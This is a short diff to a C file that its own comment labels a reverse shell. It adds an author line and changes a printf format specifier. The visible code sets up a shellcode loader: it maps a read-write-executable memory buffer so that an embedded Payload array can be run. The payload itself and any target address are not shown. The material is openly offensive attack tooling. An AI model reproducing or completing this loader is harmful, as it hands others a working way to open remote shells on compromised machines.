@@ -1,3 +1,7 @@
+// AUTHOR: MatrixTM26
+// c reverse shell
+
+
 #include <stdio.h>
 #include <string.h>
 #include <sys/mman.h>
@@ -67,7 +71,7 @@
 #endif
 
 int main() {
-    printf("Payload Size: %u bytes\n", sizeof(Payload));
+    printf("Payload Size: %lu bytes\n", sizeof(Payload));
 
     void *exec_mem = mmap(0, sizeof(Payload), PROT_READ | PROT_WRITE | PROT_EXEC, 
                           MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
